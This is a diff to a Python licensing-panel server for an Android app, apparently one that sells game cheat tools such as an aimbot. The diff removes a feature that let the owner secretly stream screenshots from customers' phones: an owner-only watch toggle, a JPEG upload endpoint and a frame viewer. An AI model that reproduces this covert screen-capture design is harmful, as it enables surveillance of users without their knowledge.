@@ -37,12 +37,8 @@ DATA = os.path.join(ROOT, "data")
 DB_PATH = os.path.join(DATA, "dashboard.db")
 
 PBKDF2_ITERS = 100_000
-VERSION = "2.3"
+VERSION = "2.4"
 STARTED_AT = time.time()
-
-# newest screen frame per phone lives in the db; this only throttles pushes so
-# a phone cannot flood the panel (bucket -> last second a frame was accepted)
-_FRAME_T = {}
 
 # products / projects a key can be issued for — seeded into the `products` table
 DEFAULT_PRODUCTS = ["ROOT AIM SILENT", "SELF BOT EXE"]
@@ -1056,10 +1052,9 @@ def api_apk_verify(handler, qs):
     kcode = row["key_code"]
     limit = int(row["device_limit"] or 0)
     used = 0
-    watch_on, screen_tok = False, ""
     if device:
         dev_row = con.execute(
-            "SELECT watch, screen_tok FROM devices WHERE key_code=? AND device_id=?",
+            "SELECT 1 FROM devices WHERE key_code=? AND device_id=?",
             (kcode, device)).fetchone()
         known = dev_row is not None
         used = con.execute(
@@ -1073,11 +1068,10 @@ def api_apk_verify(handler, qs):
                 con.close()
                 return jdump({"ok": False, "reason": "max device reached",
                               "limit": limit, "used": used}, 200)
-            screen_tok = secrets.token_hex(16)
             con.execute(
                 "INSERT INTO devices (device_id, key_code, first_seen, last_seen,"
-                " watch, screen_tok, ip) VALUES (?,?,?,?,?,?,?)",
-                (device, kcode, now, now, 0, screen_tok, ip))
+                " ip) VALUES (?,?,?,?,?)",
+                (device, kcode, now, now, ip))
             log_event(con, "device.bind",
                       f"phone {device[:14]}… bound to {kcode} ({used + 1}/{limit or '∞'})")
             used += 1
@@ -1085,12 +1079,6 @@ def api_apk_verify(handler, qs):
                       % (kcode, device[:14], lc.dur_tag(row["days"]),
                          time.strftime("%d-%b %H:%M", time.localtime(now))))
         else:
-            watch_on = bool(dev_row["watch"])
-            screen_tok = dev_row["screen_tok"]
-            if not screen_tok:
-                screen_tok = secrets.token_hex(16)
-                con.execute("UPDATE devices SET screen_tok=? WHERE key_code=? AND device_id=?",
-                            (screen_tok, kcode, device))
             con.execute("UPDATE devices SET last_seen=?, ip=? WHERE key_code=? AND device_id=?",
                         (now, ip, kcode, device))
         # every successful login counts - the panel shows it as "logins"
@@ -1110,7 +1098,6 @@ def api_apk_verify(handler, qs):
                   "receipt": lc.make_receipt(kcode, expires),
                   "token": make_launch_token(device, expires, engine),
                   "key": kcode,
-                  "watch": watch_on, "screen": screen_tok,
                   "broadcast": broadcast, "upd": upd})
 
 
@@ -1175,111 +1162,6 @@ def api_admin_settings(handler, body):
     out["maint_off_at"] = int(out["maint_off_at"] or 0)
     out["update"] = {"v": u_v, "note": u_note, "size": u_size, "sha": u_sha, "at": u_at}
     return jdump(out)
-
-
-def api_admin_watch(handler, body):
-    """turn one phone's live screen on / off. the phone picks the flag up on
-    its next sweep (and keeps streaming only while it says watch=1).
-    owner only - nobody else ever sees a customer's screen."""
-    u = auth_user(handler)
-    if not u:
-        return jdump({"error": "unauthorized"}, 401)
-    if u["role"] != "owner":
-        return jdump({"error": "owner only"}, 403)
-    key = str(body.get("key") or "")[:64]
-    dev = str(body.get("device") or "")[:64]
-    on = 1 if body.get("on") else 0
-    if not key or not dev:
-        return jdump({"error": "key + device required"}, 400)
-    con = db()
-    row = con.execute("SELECT * FROM keys WHERE key_code=?", (key,)).fetchone()
-    if row is None:
-        con.close()
-        return jdump({"error": "key not found"}, 404)
-    if on:
-        con.execute("UPDATE devices SET watch=1 WHERE key_code=? AND device_id=?", (key, dev))
-        have = con.execute("SELECT screen_tok FROM devices WHERE key_code=? AND device_id=?",
-                           (key, dev)).fetchone()
-        if have is None:
-            con.close()
-            return jdump({"error": "device not bound to this key"}, 404)
-        if not have["screen_tok"]:
-            tok = secrets.token_hex(16)
-            con.execute("UPDATE devices SET screen_tok=? WHERE key_code=? AND device_id=?",
-                        (tok, key, dev))
-    else:
-        con.execute("UPDATE devices SET watch=0 WHERE key_code=? AND device_id=?", (key, dev))
-    log_event(con, "device.watch",
-              "%s turned live screen %s on %s" % (u["username"], "ON" if on else "OFF",
-                                                  dev[:14]), u["id"])
-    con.commit()
-    st = con.execute("SELECT screen_tok FROM devices WHERE key_code=? AND device_id=?",
-                     (key, dev)).fetchone()
-    con.close()
-    return jdump({"ok": True, "watch": bool(on),
-                  "screen": st["screen_tok"] if st else ""})
-
-
-def api_apk_screen(handler, qs):
-    """the phone pushes one jpeg here; the panel only keeps the newest frame
-    per device, so the viewer can poll as fast as it likes."""
-    key = (qs.get("k", [""])[0] or "")[:64]
-    dev = (qs.get("d", [""])[0] or "")[:64]
-    tok = (qs.get("t", [""])[0] or "")[:64]
-    try:
-        n = int(handler.headers.get("Content-Length") or 0)
-    except Exception:
-        n = 0
-    if n < 100 or n > 400_000:
-        return jdump({"error": "frame size"}, 400)
-    frame = handler.rfile.read(n)
-    if not frame.startswith(b"\xff\xd8"):          # jpeg magic
-        return jdump({"error": "not a jpeg"}, 400)
-    con = db()
-    hit = con.execute(
-        "SELECT d.id FROM devices d JOIN keys k ON k.key_code=d.key_code"
-        " WHERE d.device_id=? AND d.key_code=? AND d.screen_tok=?"
-        " AND k.status='active'", (dev, key, tok)).fetchone()
-    if hit is None:
-        con.close()
-        return jdump({"error": "no"}, 403)
-    # throttle only after a valid token: a stranger's bad push must not be
-    # able to knock the real phone's next frame out of the window
-    now = int(time.time())
-    bucket = key + "|" + dev
-    if now - _FRAME_T.get(bucket, 0) < 1:          # ~1 frame/sec is plenty
-        con.close()
-        return jdump({"ok": True, "dropped": True})
-    if len(_FRAME_T) > 4096:                       # bounded throttle table
-        _FRAME_T.clear()
-    _FRAME_T[bucket] = now
-    con.execute("UPDATE devices SET last_frame=?, last_frame_at=? WHERE id=?",
-                (sqlite3.Binary(frame), now, hit["id"]))
-    con.commit()
-    con.close()
-    return jdump({"ok": True})
-
-
-def api_admin_screen(handler, qs):
-    """newest frame of a bound phone, session cookie only - owner only"""
-    u = auth_user(handler)
-    if not u:
-        return jdump({"error": "unauthorized"}, 401)
-    if u["role"] != "owner":
-        return jdump({"error": "owner only"}, 403)
-    key = (qs.get("k", [""])[0] or "")[:64]
-    dev = (qs.get("d", [""])[0] or "")[:64]
-    con = db()
-    fr = con.execute(
-        "SELECT last_frame, last_frame_at, watch FROM devices"
-        " WHERE key_code=? AND device_id=?", (key, dev)).fetchone()
-    con.close()
-    if fr is None or fr["last_frame"] is None:
-        return jdump({"error": "no frame yet"}, 404)
-    return 200, {"Content-Type": "image/jpeg",
-                 "Cache-Control": "no-store, max-age=0, must-revalidate",
-                 "X-Frame-Age": str(fr["last_frame_at"]),
-                 "X-Watch": "1" if fr["watch"] else "0"}, bytes(fr["last_frame"])
 
 
 # app self-update ----------------------------------------------------------------
@@ -1697,11 +1579,9 @@ ROUTES = {
     # public APK endpoints (no session)
     ("GET", "/api/apk/verify"): lambda h, b, q: api_apk_verify(h, q),
     ("GET", "/api/apk/ping"):   lambda h, b, q: api_apk_ping(h, q),
-    # panel side: maintenance switch, live screen, broadcast
+    # panel side: maintenance switch + broadcast
     ("GET", "/api/admin/settings"):  lambda h, b, q: api_admin_settings(h, b),
     ("POST", "/api/admin/settings"): lambda h, b, q: api_admin_settings(h, b),
-    ("POST", "/api/admin/watch"):    lambda h, b, q: api_admin_watch(h, b),
-    ("GET", "/api/admin/screen"):    lambda h, b, q: api_admin_screen(h, q),
     # app self-update: phone pulls, owner stages
     ("GET", "/api/apk/update-info"):     lambda h, b, q: api_apk_update_info(h, q),
     ("GET", "/api/apk/update-bin"):      lambda h, b, q: api_apk_update_bin(h, q),
@@ -1755,11 +1635,7 @@ class Handler(BaseHTTPRequestHandler):
         parsed = urllib.parse.urlparse(self.path)
         path = parsed.path
         qs = urllib.parse.parse_qs(parsed.query)
-        # raw jpeg upload: body arrives as bytes, json.loads() would choke
-        if method == "POST" and path == "/api/apk/screen":
-            status, hdr, resp = api_apk_screen(self, qs)
-            return self._send(status, hdr, resp)
-        # raw apk bytes for update staging - same reason as the frame push
+        # raw apk bytes for update staging - body arrives as bytes
         if method == "POST" and path == "/api/admin/update-stage":
             status, hdr, resp = api_admin_update_stage(self, qs)
             return self._send(status, hdr, resp)
